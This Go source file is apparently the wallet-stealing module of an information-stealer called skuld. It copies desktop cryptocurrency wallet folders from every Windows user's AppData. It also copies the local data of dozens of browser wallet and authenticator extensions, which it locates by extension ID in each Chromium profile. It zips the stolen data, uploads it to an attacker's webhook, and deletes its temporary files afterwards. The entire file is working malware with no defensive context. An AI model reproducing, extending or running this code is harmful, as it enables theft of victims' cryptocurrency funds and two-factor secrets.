package wallets

import (
	"fmt"
	"os"
	"strings"

	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
)

func Run(webhook string) {
	Local(webhook)
	Extensions(webhook)
}

func Local(webhook string) {
	users := hardware.GetUsers()
	tempdir := fmt.Sprintf("%s\\wallets-temp", os.TempDir())
	defer os.RemoveAll(tempdir)
	found := ""
	Paths := map[string]string{
		"Zcash":        "\\Zcash",
		"Armory":       "\\Armory",
		"Bytecoin":     "\\bytecoin",
		"Jaxx":         "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
		"Exodus":       "\\Exodus\\exodus.wallet",
		"Ethereum":     "\\Ethereum\\keystore",
		"Electrum":     "\\Electrum\\wallets",
		"AtomicWallet": "\\atomic\\Local Storage\\leveldb",
		"Guarda":       "\\Guarda\\Local Storage\\leveldb",
		"Coinomi":      "\\Coinomi\\Coinomi\\wallets",
	}

	for _, user := range users {
		userPath := fmt.Sprintf("%s\\AppData\\Roaming\\", user)

		for name, path := range Paths {
			path = fmt.Sprintf("%s%s", userPath, path)
			if !fileutil.IsDir(path) {
				continue
			}
			err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempdir, strings.Split(user, "\\")[2], name))
			if err != nil {
				continue
			}

			found += fmt.Sprintf("\n✅ %s - %s", strings.Split(user, "\\")[2], name)
		}
	}

	if found == "" {
		return
	}

	if len(found) > 4090 {
		found = "Too many wallets to list."
	}

	tempzip := fmt.Sprintf("%s\\wallets.zip", os.TempDir())
	err := fileutil.Zip(tempdir, tempzip)
	if err != nil {
		return
	}

	defer os.RemoveAll(tempdir)
	defer os.Remove(tempzip)

	requests.Webhook(webhook, map[string]interface{}{
		"embeds": []map[string]interface{}{{
			"title":       "Wallets",
			"description": "```" + found + "```",
		}},
	}, tempzip)
}

func Extensions(webhook string) {
	Paths := map[string]string{
		"Authenticator":   "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
		"Binance":         "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
		"Bitapp":          "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
		"BoltX":           "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
		"Coin98":          "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
		"Coinbase":        "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Core":            "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb",
		"Crocobit":        "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke",
		"Equal":           "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
		"Ever":            "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
		"ExodusWeb3":      "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
		"Fewcha":          "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
		"Finnie":          "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj",
		"Guarda":          "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
		"Guild":           "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
		"HarmonyOutdated": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
		"Iconex":          "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel",
		"Jaxx Liberty":    "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
		"Kaikas":          "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi",
		"KardiaChain":     "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
		"Keplr":           "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
		"Liquality":       "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
		"MEWCX":           "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
		"MaiarDEFI":       "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
		"Martian":         "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
		"Math":            "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Metamask":        "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Metamask2":       "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
		"Mobox":           "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo",
		"Nami":            "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
		"Nifty":           "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
		"Oxygen":          "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
		"PaliWallet":      "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
		"Petra":           "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
		"Phantom":         "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Pontem":          "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba",
		"Ronin":           "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
		"Safepal":         "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa",
		"Saturn":          "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
		"Slope":           "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo",
		"Solfare":         "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Sollet":          "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
		"Starcoin":        "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk",
		"Swash":           "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog",
		"TempleTezos":     "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
		"TerraStation":    "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
		"Tokenpocket":     "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii",
		"Ton":             "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
		"Tron":            "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"Trust Wallet":    "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
		"Wombat":          "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
		"XDEFI":           "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"XMR.PT":          "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm",
		"XinPay":          "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo",
		"Yoroi":           "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
		"iWallet":         "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
	}

	users := hardware.GetUsers()
	browsersPath := browsers.GetChromiumBrowsers()
	var profilesPaths []browsers.Profile
	for _, user := range users {
		for name, path := range browsersPath {
			path = fmt.Sprintf("%s\\%s", user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := browsers.Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			if browser.Name == "Opera" || browser.Name == "OperaGX" {
				profilesPaths = append(profilesPaths, browsers.Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})
				continue
			}

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if profile.IsDir() {
					files, err := os.ReadDir(fmt.Sprintf("%s\\%s", path, profile.Name()))
					if err != nil {
						continue
					}
					for _, file := range files {
						if file.Name() == "Web Data" {
							profilesPaths = append(profilesPaths, browsers.Profile{
								Name:    profile.Name(),
								Path:    fmt.Sprintf("%s\\%s", path, profile.Name()),
								Browser: browser,
							})
						}
					}
				}
			}
		}
	}

	if len(profilesPaths) == 0 {
		return
	}

	tempdir := fmt.Sprintf("%s\\extensions-temp", os.TempDir())
	defer os.RemoveAll(tempdir)
	found := ""

	for _, profile := range profilesPaths {
		for name, path := range Paths {
			path = fmt.Sprintf("%s%s", profile.Path, path)
			if !fileutil.IsDir(path) {
				continue
			}

			err := fileutil.Copy(path, fmt.Sprintf("%s\\%s\\%s", tempdir, profile.Browser.User, name))
			if err != nil {
				continue
			}
			found += fmt.Sprintf("\n✅ %s - %s", profile.Browser.User, name)
		}
	}

	if found == "" {
		return
	}

	if len(found) > 4090 {
		found = "Too many extensions to list."
	}

	tempzip := fmt.Sprintf("%s\\extensions.zip", os.TempDir())
	err := fileutil.Zip(tempdir, tempzip)
	if err != nil {
		return
	}
	defer os.Remove(tempzip)
	requests.Webhook(webhook, map[string]interface{}{
		"embeds": []map[string]interface{}{{
			"title":       "Extensions",
			"description": "```" + found + "```",
		}},
	}, tempzip)
}
